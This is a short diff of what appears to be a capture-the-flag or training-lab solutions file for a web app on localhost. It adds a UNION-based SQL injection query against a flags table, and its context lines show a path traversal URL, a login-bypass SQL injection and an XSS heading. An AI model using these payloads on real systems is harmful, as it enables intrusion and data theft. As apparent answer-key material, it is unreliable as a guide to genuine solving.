@@ -9,6 +9,10 @@ Visit http://localhost:3001/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc.h
 Username: admin'; --
 Password: anything
 
+## SQLI: Worker's Union
+
+Query: `' UNION SELECT flag, null FROM flags;--`
+
 ## XSS: Reflection
 
 ```html
